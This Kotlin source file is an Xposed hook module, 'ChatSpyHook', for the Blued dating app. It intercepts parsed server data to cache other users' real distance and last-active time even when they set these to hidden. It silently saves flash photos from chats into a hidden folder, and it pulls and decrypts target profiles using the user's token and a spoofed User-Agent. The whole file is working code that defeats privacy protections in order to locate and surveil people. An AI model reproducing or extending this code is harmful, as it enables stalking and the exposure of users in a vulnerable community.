package bxxd.hook

import android.app.Activity
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Color
import android.graphics.drawable.GradientDrawable
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.widget.*
import com.github.kyuubiran.ezxhelper.utils.findMethod
import com.github.kyuubiran.ezxhelper.utils.hookAfter
import com.github.kyuubiran.ezxhelper.utils.hookBefore
import de.robv.android.xposed.XC_MethodHook
import de.robv.android.xposed.XposedBridge
import de.robv.android.xposed.XposedHelpers
import de.robv.android.xposed.callbacks.XC_LoadPackage
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ConcurrentHashMap
import kotlin.concurrent.thread

object ChatSpyHook : BaseHook {

    private val mainHandler = Handler(Looper.getMainLooper())
    private val rootStorageDir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), ".llhook_blued")
    private var currentMsgList: List<*>? = null

    // 供 TrackHook 秒读的雷达缓存
    data class UserLeakedInfo(val distance: Double, val lastOperate: Long, val hideDist: Boolean, val hideTime: Boolean)
    val leakedDataCache = ConcurrentHashMap<String, UserLeakedInfo>()

    override fun init(lpparam: XC_LoadPackage.LoadPackageParam) {
        
        // 1. 拦截数据包解析，偷取真实距离和活跃时间
        val gsonHook = object : XC_MethodHook() {
            override fun beforeHookedMethod(param: MethodHookParam) {
                val jsonStr = param.args[0] as? String ?: return
                if (jsonStr.contains("\"data\":[{") && jsonStr.contains("\"uid\"")) {
                    thread {
                        try {
                            val jsonObject = JSONObject(jsonStr)
                            val dataArray = jsonObject.optJSONArray("data")
                            if (dataArray != null) {
                                for (i in 0 until dataArray.length()) {
                                    val userObj = dataArray.optJSONObject(i) ?: continue
                                    val uid = userObj.optString("uid", "")
                                    if (uid.isNotEmpty()) {
                                        val dist = userObj.optDouble("distance", -1.0)
                                        val op = userObj.optLong("last_operate", 0L)
                                        val hideDist = userObj.optInt("is_hide_distance", 0) == 1
                                        val hideTime = userObj.optInt("is_hide_last_operate", 0) == 1
                                        
                                        val existing = leakedDataCache[uid]
                                        val bestDist = if (dist > 0.001 && dist != 99999.0) dist else (existing?.distance ?: dist)
                                        val bestOp = if (op > 1000000000L) op else (existing?.lastOperate ?: op)
                                        val bestHideDist = if (userObj.has("is_hide_distance")) hideDist else (existing?.hideDist ?: hideDist)
                                        val bestHideTime = if (userObj.has("is_hide_last_operate")) hideTime else (existing?.hideTime ?: hideTime)

                                        leakedDataCache[uid] = UserLeakedInfo(bestDist, bestOp, bestHideDist, bestHideTime)
                                    }
                                }
                            }
                        } catch (e: Throwable) {}
                    }
                }
            }
        }
        
        try {
            val gsonClass = XposedHelpers.findClassIfExists("com.google.gson.Gson", lpparam.classLoader)
            if (gsonClass != null) {
                XposedBridge.hookAllMethods(gsonClass, "fromJson", gsonHook)
            }
        } catch (e: Throwable) {}

        // 2. 拦截消息列表，实现闪照自动保存
        try {
            val chatFragmentClass = lpparam.classLoader.loadClass(Config.TargetClasses.MSG_CHATTING_FRAGMENT)
            val presentClass = lpparam.classLoader.loadClass(Config.TargetClasses.MSG_CHATTING_PRESENT)

            presentClass.findMethod { name == "onMsgDataChanged" && parameterTypes.size == 1 && parameterTypes[0] == java.util.List::class.java }
                .hookAfter { param ->
                    val msgList = param.args[0] as? List<*> ?: return@hookAfter
                    currentMsgList = msgList 
                    
                    msgList.forEach { message ->
                        if (message == null) return@forEach
                        try {
                            val isFromSelf = XposedHelpers.callMethod(message, "isFromSelf") as Boolean
                            if (!isFromSelf) {
                                val msgTypeNum = XposedHelpers.getObjectField(message, "msgType") as? Number
                                val msgType = msgTypeNum?.toInt() ?: -1
                                
                                if (msgType == 2 || msgType == 5 || msgType == 24 || msgType == 25) {
                                    val fromId = XposedHelpers.getLongField(message, "fromId").toString()
                                    val fromNickName = XposedHelpers.getObjectField(message, "fromNickName") as? String ?: "未知"
                                    val safeName = fromNickName.replace(Regex("[\\\\/:*?\"<>|]"), "_")
                                    val content = XposedHelpers.getObjectField(message, "msgContent") as? String ?: ""
                                    
                                    val match = "(https?://[^\\s\"'|}]+)".toRegex().find(content)
                                    if (match != null) {
                                        val cleanUrl = match.value
                                        val userDir = findUserDir(fromId, safeName)
                                        if (File(userDir, "disable_autosave.jpg").exists()) return@forEach
                                        val fileName = cleanUrl.substringAfterLast("/").substringBefore("?") + ".jpg"
                                        val destFile = File(userDir, fileName)
                                        val deletedMarker = File(userDir, "deleted_$fileName")
                                        if (!destFile.exists() && !deletedMarker.exists()) {
                                            thread {
                                                try {
                                                    val conn = URL(cleanUrl).openConnection() as HttpURLConnection
                                                    conn.connectTimeout = 5000
                                                    conn.inputStream.use { input ->
                                                        FileOutputStream(destFile).use { output -> input.copyTo(output) }
                                                    }
                                                } catch (e: Throwable) {}
                                            }
                                        }
                                    }
                                }
                            }
                        } catch (e: Throwable) {}
                    }
                }

            // 3. 原生 UI 按钮劫持
            chatFragmentClass.findMethod { name == "onResume" }.hookAfter { param ->
                val fragmentInstance = param.thisObject
                val activity = XposedHelpers.callMethod(fragmentInstance, "getActivity") as? Activity ?: return@hookAfter
                val rootLayout = activity.findViewById<ViewGroup>(android.R.id.content) ?: return@hookAfter
                
                rootLayout.findViewWithTag<View>("SpyBtn")?.let { rootLayout.removeView(it) }

                val btImgId = activity.resources.getIdentifier("bt_img", "id", activity.packageName)
                val btEmotionId = activity.resources.getIdentifier("bt_emotion", "id", activity.packageName)

                if (btImgId != 0) {
                    val btImg = rootLayout.findViewById<ImageView>(btImgId)
                    btImg?.setOnLongClickListener {
                        val (targetUid, targetName) = extractUidAndName(fragmentInstance)
                        if (targetUid.isNotEmpty() && targetUid != "0") {
                            openSecretAlbum(activity, targetUid, targetName)
                        }
                        true 
                    }
                }

                if (btEmotionId != 0) {
                    val btEmotion = rootLayout.findViewById<ImageView>(btEmotionId)
                    btEmotion?.setOnLongClickListener {
                        val (targetUid, _) = extractUidAndName(fragmentInstance)
                        if (targetUid.isNotEmpty() && targetUid != "0") {
                            val token = Config.getAuthToken(activity)
                            if (token.isNotEmpty()) {
                                Toast.makeText(activity, "正在透视目标信息...", Toast.LENGTH_SHORT).show()
                                thread { fetchAndShowInfo(activity, targetUid, token, lpparam.classLoader) }
                            }
                        }
                        true
                    }
                }
            }
        } catch (e: Throwable) {}
    }

    // =========================================================================
    //  阶段 2: 秘密相册公开 API (供 com.example.ui.SecretAlbumScreen 调用)
    //  存储: Pictures/.llhook_blued/<uid>_<safeName>/*.jpg (含 .nomedia 物理隐身)
    //  自动入库: hook 消息列表 → 闪照 URL 下载到对应用户目录
    //  开关: disable_autosave.jpg 存在 = 该用户停止自动入库
    // =========================================================================

    /** 相册用户 (扫描 rootStorageDir 得出) */
    data class AlbumUser(
        val uid: String,
        val displayName: String,   // safeName (文件名安全)
        val photoCount: Int,
        val autoSaveEnabled: Boolean,
        val dir: java.io.File
    )

    /** 扫描所有用户相册 (按照片数倒序) */
    fun listAlbumUsers(): List<AlbumUser> {
        if (!rootStorageDir.exists()) return emptyList()
        val out = mutableListOf<AlbumUser>()
        rootStorageDirs().forEach { dir ->
            if (!dir.isDirectory) return@forEach
            val name = dir.name
            // <uid>_<safeName>: uid 是首个下划线前部分
            val under = name.indexOf('_')
            if (under <= 0) return@forEach
            val uid = name.substring(0, under)
            val safeName = name.substring(under + 1)
            if (uid.isEmpty() || !uid.matches(Regex("\\d+"))) return@forEach
            val photos = listPhotosInDir(dir)
            out.add(AlbumUser(uid, safeName, photos.size,
                autoSaveEnabled = !java.io.File(dir, "disable_autosave.jpg").exists(), dir))
        }
        return out.sortedByDescending { it.photoCount }
    }

    private fun rootStorageDirs(): Array<java.io.File> =
        rootStorageDir.listFiles { f -> f.isDirectory && f.name.contains("_") } ?: emptyArray()

    private fun listPhotosInDir(dir: java.io.File): List<java.io.File> =
        (dir.listFiles { f ->
            f.isFile && f.name.lowercase().let { it.endsWith(".jpg") || it.endsWith(".jpeg") || it.endsWith(".png") }
                && f.name != "disable_autosave.jpg"
        } ?: emptyArray()).sortedByDescending { it.lastModified() }

    /** 列出某用户的所有照片 (按时间倒序) */
    fun listUserPhotos(uid: String, safeName: String): List<java.io.File> {
        val dir = findUserDir(uid, safeName)
        return listPhotosInDir(dir)
    }

    /** 删除一张照片 */
    fun deletePhoto(file: java.io.File): Boolean = file.delete()

    /** 设置某用户自动入库开关 (disable_autosave.jpg 标记法) */
    fun setAutoSaveEnabled(uid: String, safeName: String, enabled: Boolean) {
        val dir = findUserDir(uid, safeName)
        val flag = java.io.File(dir, "disable_autosave.jpg")
        if (enabled) flag.delete() else { dir.mkdirs(); flag.createNewFile() }
    }

    /** 销毁某用户相册 (清空照片 + 关闭自动入库) */
    fun destroyAlbum(uid: String, safeName: String): Int {
        val dir = findUserDir(uid, safeName)
        var n = 0
        listPhotosInDir(dir).forEach { if (it.delete()) n++ }
        dir.mkdirs(); java.io.File(dir, "disable_autosave.jpg").createNewFile()
        return n
    }

    /** 阶段 2: 弹出 Compose 版秘密相册页 (某用户) — 聊天页入口调用 */
    fun openSecretAlbum(activity: android.app.Activity, uid: String, name: String) {
        com.example.ui.showHostComposeScreen(activity) { onClose ->
            com.example.ui.SecretAlbumScreen(activity, uid, name, onClose)
        }
    }

    fun findUserDir(uid: String, safeName: String): File {
        if (!rootStorageDir.exists()) rootStorageDir.mkdirs()
        try { File(rootStorageDir, ".nomedia").createNewFile() } catch (e: Throwable) {}
        val existingDirs = rootStorageDir.listFiles { file -> file.isDirectory && file.name.startsWith("${uid}_") }
        val userDir = if (!existingDirs.isNullOrEmpty()) existingDirs[0] else File(rootStorageDir, "${uid}_${safeName}")
        if (!userDir.exists()) userDir.mkdirs()
        try { File(userDir, ".nomedia").createNewFile() } catch (e: Throwable) {}
        return userDir
    }

    private fun dp2px(activity: Activity, dp: Float): Int = (dp * activity.resources.displayMetrics.density + 0.5f).toInt()
    
    fun getThumbnail(file: File, reqSize: Int): Bitmap? {
        try {
            val options = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            BitmapFactory.decodeFile(file.absolutePath, options)
            options.inSampleSize = calculateInSampleSize(options, reqSize, reqSize)
            options.inJustDecodeBounds = false
            return BitmapFactory.decodeFile(file.absolutePath, options)
        } catch (e: Throwable) { return null }
    }
    
    private fun calculateInSampleSize(options: BitmapFactory.Options, reqWidth: Int, reqHeight: Int): Int {
        val (height: Int, width: Int) = options.outHeight to options.outWidth
        var inSampleSize = 1
        if (height > reqHeight || width > reqWidth) {
            val halfHeight: Int = height / 2; val halfWidth: Int = width / 2
            while (halfHeight / inSampleSize >= reqHeight && halfWidth / inSampleSize >= reqWidth) inSampleSize *= 2
        }
        return inSampleSize
    }
    
    private fun extractUidAndName(fragmentInstance: Any): Pair<String, String> {
        var targetUid = ""; var targetName = "未命名"
        try {
            val bundle = XposedHelpers.callMethod(fragmentInstance, "getArguments") as? Bundle
            if (bundle != null) {
                for (key in listOf("passby_session_id", "sessionId", "session_id", "uid", "target_uid")) {
                    val value = bundle.get(key)?.toString()
                    if (!value.isNullOrEmpty() && value != "0" && value.matches(Regex("\\d+"))) { targetUid = value; break }
                }
                if (targetUid.isEmpty() || targetUid == "0") {
                    for (key in bundle.keySet()) {
                        val value = bundle.get(key)?.toString() ?: ""
                        if (value.matches(Regex("\\d{5,}"))) { targetUid = value; break }
                    }
                }
                targetName = bundle.getString("passby_nick_name") ?: bundle.getString("session_name") ?: bundle.getString("name") ?: "神秘人"
            }
        } catch (e: Throwable) {}
        return Pair(targetUid, targetName)
    }
    
    private fun decryptBluedData(classLoader: ClassLoader, encryptedText: String): String {
        return try {
            if (encryptedText.isEmpty()) return ""
            val aesCryptoClass = classLoader.loadClass("com.blued.android.framework.utils.AesCrypto")
            XposedHelpers.callStaticMethod(aesCryptoClass, "e", encryptedText) as? String ?: ""
        } catch (e: Throwable) { "" }
    }

    // 🚀 核心更新：动态生成设备自适应的 User-Agent 
    private fun getDynamicUniversalUserAgent(): String {
        // 读取运行设备的真实安卓版本、型号和编译号
        val release = android.os.Build.VERSION.RELEASE ?: "13"
        val model = android.os.Build.MODEL ?: "Unknown"
        val id = android.os.Build.ID ?: "Unknown"
        
        // 动态组装成服务器校验的格式，并挂上 app/7 的极速版标识
        return "Mozilla/5.0 (Linux; U; Android $release; $model Build/$id) Android/070647_7.64.7_2842_0221 (Asia/Shanghai) Dalvik/2.1.0 app/7"
    }
    
      private fun doHttpGet(urlStr: String, token: String): JSONObject? {
        try {
            val url = URL(urlStr)
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "GET"
            conn.setRequestProperty("authorization", token)
            
            // 🚀 核心修复：直接去拿 NetworkSpoofHook 刚才偷存下来的、绝对是最新版本的 UA！
            // 如果刚打开 App 还没抓到（极小概率），兜底用动态生成的 UA 防止崩溃
            val targetUA = if (NetworkSpoofHook.capturedLatestUA.isNotEmpty()) {
                NetworkSpoofHook.capturedLatestUA
            } else {
                getDynamicUniversalUserAgent() 
            }
            
            conn.setRequestProperty("user-agent", targetUA)
            conn.connectTimeout = 5000
            if (conn.responseCode == 200) return JSONObject(conn.inputStream.bufferedReader().use { it.readText() })
        } catch (e: Throwable) {}
        return null
    }

    
    private fun fetchAndShowInfo(activity: Activity, uid: String, token: String, classLoader: ClassLoader) {
        try {
            val basicJsonArgo = doHttpGet("https://argo.blued.cn/users/$uid/basic", token)?.optJSONArray("data")?.optJSONObject(0) ?: JSONObject()
            val fullJsonSocial = doHttpGet("https://social.blued.cn/users/$uid?from=&is_living=false&is_live_flow=1&is_vip_page=0&is_shadow=0&is_call=0", token)?.optJSONArray("data")?.optJSONObject(0) ?: JSONObject()
            val data = JSONObject()
            fullJsonSocial.keys().forEach { data.put(it, fullJsonSocial.get(it)) }
            basicJsonArgo.keys().forEach { data.put(it, basicJsonArgo.get(it)) }

            val cachedInfo = leakedDataCache[uid]
            if (data.length() > 0 || cachedInfo != null) {
                val name = data.optString("name", "未知")
                val age = data.optInt("age", 0); val height = data.optInt("height", 0); val weight = data.optInt("weight", 0)
                var role = data.optString("role", "未知")
                role = when (role) { "-1", "-1.0" -> "其他"; "1", "1.0" -> "1 ";  "-2", "-2.0" -> "side "; "0", "0.0" -> "0 "; "0.5" -> "0.5 "; "0.75" -> "0.75 (偏1)"; "0.25" -> "0.25 (偏0)"; "~" -> "保密"; else -> role }
                
                val location = data.optString("location", "")
                val hideDist = cachedInfo?.hideDist ?: (data.optInt("is_hide_distance", 0) == 1)
                val dist = if (cachedInfo != null && cachedInfo.distance > 0.001 && cachedInfo.distance != 99999.0) cachedInfo.distance else data.optDouble("distance", -1.0)
                
                var mergedLocation = ""
                if (dist >= 0 && dist != 99999.0) {
                    mergedLocation = "${dist}km"
                    if (hideDist) mergedLocation += ""
                } else if (location.isNotEmpty() && location != "保密") {
                    mergedLocation = location
                } else {
                    mergedLocation = "保密 (请先去【大厅-附近】列表刷出他的头像，雷达方可截获)"
                }

                val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                val lastLoginTs = data.optLong("last_login", 0L)
                val hideLastOperate = cachedInfo?.hideTime ?: (data.optInt("is_hide_last_operate", 0) == 1)
                val lastOperateTs = if (cachedInfo != null && cachedInfo.lastOperate > 1000000000L) cachedInfo.lastOperate else data.optLong("last_operate", 0L)
                
                val activeTs = if (lastOperateTs > 0) lastOperateTs else lastLoginTs
                var timeStr = if (activeTs > 1000000000L) sdf.format(Date(activeTs * 1000)) else "未知"
                if (hideLastOperate && timeStr != "未知") timeStr += ""
                
                var regStr = "保密"
                val regTs = data.optLong("registration_time", 0L)
                if (regTs > 1000000000L) {
                    regStr = sdf.format(Date(regTs * 1000))
                } else {
                    val regEncrypt = data.optString("registration_time_encrypt", "")
                    if (regEncrypt.isNotEmpty()) {
                        val decryptedStr = decryptBluedData(classLoader, regEncrypt)
                        val decryptedTs = decryptedStr.toLongOrNull() ?: 0L
                        if (decryptedTs > 1000000000L) regStr = sdf.format(Date(decryptedTs * 1000)) + " "
                    }
                }
                val msg = "昵称：$name\n情况 ：${age}岁 / ${height}cm / ${weight}kg\n角色：$role\n注册时间：$regStr\n最后活跃：$timeStr\n距离：$mergedLocation"
                
                val isNightMode = (activity.resources.configuration.uiMode and android.content.res.Configuration.UI_MODE_NIGHT_MASK) == android.content.res.Configuration.UI_MODE_NIGHT_YES
                val themeResId = if (isNightMode) android.R.style.Theme_DeviceDefault_Dialog_Alert else android.R.style.Theme_DeviceDefault_Light_Dialog_Alert

                mainHandler.post { com.example.ui.showTrackResult(activity, true, msg, 0.0, 0.0, "资料透视成功") }
            }
        } catch (e: Throwable) {}
    }
}
